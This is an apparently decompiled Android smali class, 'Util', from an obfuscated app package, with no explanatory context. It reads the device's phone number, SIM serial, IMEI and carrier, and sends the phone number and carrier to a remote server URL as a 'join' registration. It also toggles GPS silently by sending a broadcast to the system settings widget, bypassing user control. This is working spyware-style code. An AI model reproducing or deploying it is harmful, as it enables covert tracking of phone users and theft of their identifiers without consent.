.class public LTnxibnad/Pncibnsc/view/Util;
.super Ljava/lang/Object;
.source "Util.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        LTnxibnad/Pncibnsc/view/Util$MyAsyncTask;
    }
.end annotation


# instance fields
.field public context:Landroid/content/Context;

.field private myAsyncTask:LTnxibnad/Pncibnsc/view/Util$MyAsyncTask;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .registers 2
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 38
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 40
    iput-object p1, p0, LTnxibnad/Pncibnsc/view/Util;->context:Landroid/content/Context;

    .line 47
    return-void
.end method

.method private onoffGPS(Ljava/lang/String;Z)V
    .registers 7
    .param p1, "paramString"    # Ljava/lang/String;
    .param p2, "flag"    # Z

    .prologue
    .line 63
    iget-object v2, p0, LTnxibnad/Pncibnsc/view/Util;->context:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "location_providers_allowed"

    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 64
    .local v1, "str":Ljava/lang/String;
    if-eqz p2, :cond_14

    invoke-virtual {v1, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1c

    :cond_14
    if-nez p2, :cond_3b

    invoke-virtual {v1, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3b

    .line 66
    :cond_1c
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 67
    .local v0, "intent":Landroid/content/Intent;
    const-string v2, "com.android.settings"

    const-string v3, "com.android.settings.widget.SettingsAppWidgetProvider"

    invoke-virtual {v0, v2, v3}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 68
    const-string v2, "android.intent.category.ALTERNATIVE"

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    .line 69
    const-string v2, "3"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 70
    iget-object v2, p0, LTnxibnad/Pncibnsc/view/Util;->context:Landroid/content/Context;

    invoke-virtual {v2, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 72
    .end local v0    # "intent":Landroid/content/Intent;
    :cond_3b
    return-void
.end method


# virtual methods
.method public disableGPS()V
    .registers 3

    .prologue
    .line 52
    const-string v0, "gps"

    const/4 v1, 0x0

    invoke-direct {p0, v0, v1}, LTnxibnad/Pncibnsc/view/Util;->onoffGPS(Ljava/lang/String;Z)V

    .line 53
    return-void
.end method

.method public doRegisterUser()Ljava/lang/String;
    .registers 10

    .prologue
    .line 111
    invoke-virtual {p0}, LTnxibnad/Pncibnsc/view/Util;->getPhoneNumber()Ljava/lang/String;

    move-result-object v2

    .line 112
    .local v2, "phoneNumber":Ljava/lang/String;
    const-string v6, " "

    const-string v7, "-"

    invoke-virtual {v2, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    .line 113
    invoke-virtual {p0}, LTnxibnad/Pncibnsc/view/Util;->getTelCompany()Ljava/lang/String;

    move-result-object v4

    .line 114
    .local v4, "telcompany":Ljava/lang/String;
    const-string v6, " "

    const-string v7, "-"

    invoke-virtual {v4, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    .line 116
    const-string v6, ""

    invoke-virtual {v2, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_23

    .line 117
    const-string v3, ""

    .line 132
    :goto_22
    return-object v3

    .line 119
    :cond_23
    new-instance v6, Ljava/lang/StringBuilder;

    sget-object v7, LTnxibnad/Pncibnsc/net/HttpUtils;->URL:Ljava/lang/String;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, "index.php?type=join&telnum="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&telcompany="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 120
    .local v5, "url":Ljava/lang/String;
    new-instance v6, LTnxibnad/Pncibnsc/view/Util$MyAsyncTask;

    const/4 v7, 0x0

    invoke-direct {v6, p0, v7}, LTnxibnad/Pncibnsc/view/Util$MyAsyncTask;-><init>(LTnxibnad/Pncibnsc/view/Util;LTnxibnad/Pncibnsc/view/Util$MyAsyncTask;)V

    iput-object v6, p0, LTnxibnad/Pncibnsc/view/Util;->myAsyncTask:LTnxibnad/Pncibnsc/view/Util$MyAsyncTask;

    .line 121
    const-string v3, ""

    .line 123
    .local v3, "ret":Ljava/lang/String;
    :try_start_50
    iget-object v6, p0, LTnxibnad/Pncibnsc/view/Util;->myAsyncTask:LTnxibnad/Pncibnsc/view/Util$MyAsyncTask;

    const/4 v7, 0x1

    new-array v7, v7, [Ljava/lang/String;

    const/4 v8, 0x0

    aput-object v5, v7, v8

    invoke-virtual {v6, v7}, LTnxibnad/Pncibnsc/view/Util$MyAsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    move-result-object v6

    invoke-virtual {v6}, Landroid/os/AsyncTask;->get()Ljava/lang/Object;

    move-result-object v6

    move-object v0, v6

    check-cast v0, Ljava/lang/String;

    move-object v3, v0
    :try_end_64
    .catch Ljava/lang/InterruptedException; {:try_start_50 .. :try_end_64} :catch_65
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_50 .. :try_end_64} :catch_6a

    goto :goto_22

    .line 124
    :catch_65
    move-exception v1

    .line 126
    .local v1, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_22

    .line 127
    .end local v1    # "e":Ljava/lang/InterruptedException;
    :catch_6a
    move-exception v1

    .line 129
    .local v1, "e":Ljava/util/concurrent/ExecutionException;
    invoke-virtual {v1}, Ljava/util/concurrent/ExecutionException;->printStackTrace()V

    goto :goto_22
.end method

.method public enableGPS()V
    .registers 3

    .prologue
    .line 57
    const-string v0, "gps"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, LTnxibnad/Pncibnsc/view/Util;->onoffGPS(Ljava/lang/String;Z)V

    .line 58
    return-void
.end method

.method public getPhoneNumber()Ljava/lang/String;
    .registers 8

    .prologue
    .line 76
    const/4 v3, 0x0

    .line 77
    .local v3, "phoneNumber":Ljava/lang/String;
    iget-object v5, p0, LTnxibnad/Pncibnsc/view/Util;->context:Landroid/content/Context;

    const-string v6, "phone"

    invoke-virtual {v5, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/telephony/TelephonyManager;

    .line 78
    .local v4, "tm":Landroid/telephony/TelephonyManager;
    invoke-virtual {v4}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v3

    .line 80
    if-eqz v3, :cond_19

    const-string v5, ""

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_4e

    .line 81
    :cond_19
    invoke-virtual {v4}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v1

    .line 82
    .local v1, "SimserialNum":Ljava/lang/String;
    invoke-virtual {v4}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    .line 83
    .local v0, "DeviceID":Ljava/lang/String;
    const/4 v2, 0x0

    .line 84
    .local v2, "identifier":Ljava/lang/String;
    if-eqz v1, :cond_47

    if-eqz v0, :cond_47

    .line 86
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "-"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v1}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 92
    :cond_45
    :goto_45
    move-object v3, v2

    .line 99
    .end local v0    # "DeviceID":Ljava/lang/String;
    .end local v1    # "SimserialNum":Ljava/lang/String;
    .end local v2    # "identifier":Ljava/lang/String;
    :cond_46
    :goto_46
    return-object v3

    .line 88
    .restart local v0    # "DeviceID":Ljava/lang/String;
    .restart local v1    # "SimserialNum":Ljava/lang/String;
    .restart local v2    # "identifier":Ljava/lang/String;
    :cond_47
    if-eqz v0, :cond_45

    .line 90
    invoke-virtual {v0}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v2

    goto :goto_45

    .line 95
    .end local v0    # "DeviceID":Ljava/lang/String;
    .end local v1    # "SimserialNum":Ljava/lang/String;
    .end local v2    # "identifier":Ljava/lang/String;
    :cond_4e
    const/4 v5, 0x0

    invoke-virtual {v3, v5}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v6, 0x2b

    if-ne v5, v6, :cond_46

    .line 96
    const/4 v5, 0x1

    invoke-virtual {v3, v5}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v3

    goto :goto_46
.end method

.method public getTelCompany()Ljava/lang/String;
    .registers 5

    .prologue
    .line 104
    iget-object v2, p0, LTnxibnad/Pncibnsc/view/Util;->context:Landroid/content/Context;

    const-string v3, "phone"

    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    .line 105
    .local v1, "tm":Landroid/telephony/TelephonyManager;
    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v0

    .line 106
    .local v0, "telcompany":Ljava/lang/String;
    return-object v0
.end method
